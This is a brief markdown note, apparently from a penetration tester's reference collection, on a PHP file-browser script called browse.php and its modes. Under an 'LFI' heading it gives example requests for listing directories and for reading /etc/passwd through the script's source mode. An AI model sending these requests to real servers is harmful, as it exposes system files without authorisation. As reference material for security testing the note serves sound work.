# php powerbrowse

* Filename: browse.php

## Info

This file allows directory listing, reading files and more. It has different modes depending on the file it accesses.

1. source: shows source code of file
2. thumb: generates thumbnail of image file
3. mime | logo | favicon : returns mime type of file
4. read: returns base64 value of image file.
5. listdir: list the directory listing (default option)

## LFI

```bash
# directory listing 
/browse.php?dir=<dir-name>

# LFI
/browse.php?p=source&file=</etc/passwd>
```
